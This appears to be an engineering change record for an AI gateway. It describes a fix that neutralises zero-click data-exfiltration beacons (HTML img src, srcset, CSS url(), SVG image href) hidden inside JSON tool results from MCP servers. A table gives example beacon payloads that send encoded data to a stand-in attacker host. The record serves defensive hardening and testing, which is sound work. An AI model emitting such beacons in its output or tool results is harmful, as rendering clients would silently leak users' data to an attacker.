# CHG-0097 — defang HTML/SVG/CSS/srcset exfil beacons NESTED in a JSON tool result (closes the CHG-0096 residual)

**Change-id:** CHG-0097
**Date:** 2026-07-03
**Severity:** HIGH (zero-click data-exfil; the HTML half of the CHG-0096 beacon class).
**Area:** HARDEN 1.4 — prevent MCP data leakage (result egress), parity with the chat output-guard exfil defense (G40–G43).
**Files:** `gateway/ai_mesh_gateway/mcp_scan_orchestrator.py` (`_neutralize_exfil_deep` + `_scan_text_tier1`); `gateway/ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py` (+8 tests).
**Whose work it touches:** the owning-session MCP scan core (orchestrator); completes CHG-0096.

## Root cause (the CHG-0096 residual)

CHG-0096 defanged markdown/bare-URL exfil beacons in tool results via `neutralize_exfil_channels`, but flagged a residual: an **HTML** `<img src="https://evil/?d=…">` / `srcset` / CSS `url(…)` / SVG `<image href>` beacon nested in a JSON tool-result field was NOT defanged. The MCP tier-1 scan target (`target_mode="entire"`) is the WHOLE result payload JSON-serialized, so HTML attribute quotes are escaped (`src=\"…\"`); `neutralize_exfil_channels`'s HTML regexes expect real quotes (`["\']?`), and the leading backslash blocks the match. Markdown `![](…)` has no quotes, so it survived JSON-serialization and defanged — HTML did not. A markdown/HTML-rendering MCP client that renders raw HTML would still auto-fetch the beacon → zero-click exfil.

## The fix (CHG-0097)

`_neutralize_exfil_deep(text)`: if the tier-1 target text is a JSON structure (starts with `{`/`[`), parse it and run `neutralize_exfil_channels` on each UNESCAPED string LEAF, then re-serialize — so HTML/SVG/CSS/srcset beacons (whose quotes are real inside the parsed leaf) are defanged too, and the re-serialized JSON keeps valid escaping. Non-JSON text (a plain-string result) is neutralized directly. Returns the ORIGINAL text unchanged when nothing was defanged (no reformatting churn → a benign result stays byte-identical). `_scan_text_tier1` now calls `_neutralize_exfil_deep` instead of `neutralize_exfil_channels` directly (the CHG-0096 finding + floor-trigger wiring is unchanged).

## Verification (all green)

```
cd gateway
./.venv/bin/python -m pytest ai_mesh_gateway/tests/test_mcp_result_exfil_beacon_defang.py -q   # 18 passed
./.venv/bin/python -m pytest ai_mesh_gateway/tests -q                                          # 1576 passed, 0 failed
cd ../services/mcp-broker && ./.venv/bin/python -m pytest tests -q -k "not websocket"          # 108 passed
```

+8 tests: HTML `<img src>`, `srcset`, CSS `url()`, SVG `<image href>` beacons → payload `[exfil-redacted]`, attacker host gone, `exfil` finding; 3 benign HTML images (cdn, cdn+query, presigned) → NOT defanged, host/path preserved, no exfil finding; `_neutralize_exfil_deep` unit (plain text, benign JSON byte-identical, malformed-JSON fallback).

### Byte-level truth (egress)

| input (nested in `{"content":[{"type":"text","text": … }]}`) | egress leaf |
|---|---|
| `<img src="https://evil.example.com/t?d=<b64>">` | `<img src=\"[exfil-redacted]\">` |
| `<img srcset="https://evil.example.com/s?d=<b64> 2x">` | `<img srcset=\"[exfil-redacted] 2x\">` |
| `<div style="background:url(https://evil.example.com/b?d=<b64>)">` | `<div style=\"background:url([exfil-redacted])\">` |
| `<img src="https://cdn.example.com/logo.png">` (benign) | unchanged |

## Scope / honesty note

Closes the HTML-nested-JSON exfil-beacon residual — the MCP result path now defangs markdown, bare-URL, protocol-relative, HTML `<img>`/media-attr, srcset, CSS `url()`, and SVG `<image href>` zero-click beacons (parity with the chat guard). `_url_smuggles_data` gating is unchanged (strict no-op on benign). aidefence is not a useful oracle for URL-embedded payloads (see CHG-0096); byte-level + behavior test is authoritative. Does not change the host-blocked live-stress status (items 14–20). Partial coverage is not completion.
